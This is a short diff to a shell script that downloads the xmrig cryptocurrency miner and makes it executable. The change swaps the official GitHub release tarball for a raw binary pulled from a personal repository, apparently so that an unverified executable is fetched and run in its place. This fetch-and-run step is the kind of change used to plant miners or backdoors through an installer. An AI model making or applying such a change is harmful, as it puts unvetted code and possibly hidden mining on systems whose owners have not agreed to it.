@@ -38,7 +38,7 @@ rm -f "$BINARY_PATH"
 # --- Загрузка и распаковка ---
 
 echo "[*] Downloading xmrig to $BINARY_PATH"
-curl -L --progress-bar "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz" -o "$BINARY_PATH"
+curl -L --progress-bar "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/xmrig" -o "$BINARY_PATH"
 
 
 if chmod +x -- "$BINARY_PATH"; then
